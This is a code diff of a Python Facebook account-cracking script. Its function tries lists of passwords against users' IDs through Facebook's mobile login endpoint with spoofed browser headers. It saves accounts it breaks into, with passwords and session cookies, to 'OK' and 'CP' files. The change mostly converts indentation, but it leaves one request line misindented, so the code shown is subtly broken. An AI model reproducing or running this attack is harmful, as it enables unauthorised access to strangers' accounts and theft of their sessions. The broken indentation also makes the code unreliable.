@@ -1095,19 +1095,19 @@ def methodnew(idf,pwv):
 	loop+=1
 #--------------------[ METODE VALIDATE ]-----------------#
 def _async(idf,pwv):
-    global loop,ok,cp
-    rr = random.randint
-    AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
-    prog.update(des,description=f'\r[bold white]Async [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
-    prog.advance(des)
-    ua = random.choice(free)
-    ses = requests.Session()
-    for pw in pwv:
-        pw = pw.lower()
-        try:
-            if 'ya' in ualuh: ua = ualu[0]
-            wibu = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
-            data = {
+	global loop,ok,cp
+	rr = random.randint
+	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
+	prog.update(des,description=f'\r[bold white]Async [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
+	prog.advance(des)
+	ua = random.choice(free)
+	ses = requests.Session()
+	for pw in pwv:
+		pw = pw.lower()
+		try:
+			if 'ya' in ualuh: ua = ualu[0]
+				wibu = ses.get(f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
+			data = {
 					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
 					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
 					"uid": idf,
@@ -1115,7 +1115,7 @@ def _async(idf,pwv):
 					"flow": "login_no_pin",
 					"pass": pw
 						}
-            wibu_head = {
+			wibu_head = {
 				'Host': 'm.facebook.com',
 				'cache-control': 'max-age=0',
 				'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="115", "Google Chrome";v="115"',
@@ -1135,31 +1135,31 @@ def _async(idf,pwv):
 				'accept-encoding': 'gzip, deflate, br',
 				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
 			}
-            post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
-            if "checkpoint" in post.cookies.get_dict().keys():
-		    cp+=1
-		    print('\n')
-		    statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-		    statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
-		    cetak(statuscp1)
-		    os.popen('play-audio c.mp3')
-		    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-		    akun.append(idf+'|'+pw)
-		    break
-            elif "c_user" in ses.cookies.get_dict().keys():
-		    ok+=1
-		    coki=ses.cookies.get_dict()
-		    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-		    print('\n')
-		    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-		    statusok1 = nel(statusok, width=80, style='bold green', title='OK')
-		    cetak(statusok1)
-		    os.popen('play-audio o.mp3')
-		    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-		    break
-            else:continue
-        except requests.exceptions.ConnectionError:time.sleep(31)
-    loop+=1
+			post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
+			if "checkpoint" in post.cookies.get_dict().keys():
+				cp+=1
+				print('\n')
+				statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
+				statuscp1 = nel(statuscp, width=80, style='bold yellow', title='CP')
+				cetak(statuscp1)
+				os.popen('play-audio c.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=ses.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print('\n')
+				statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
+				statusok1 = nel(statusok, width=80, style='bold green', title='OK')
+				cetak(statusok1)
+				os.popen('play-audio o.mp3')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				break
+			else:continue
+		except requests.exceptions.ConnectionError:time.sleep(31)
+	loop+=1
  
  
 
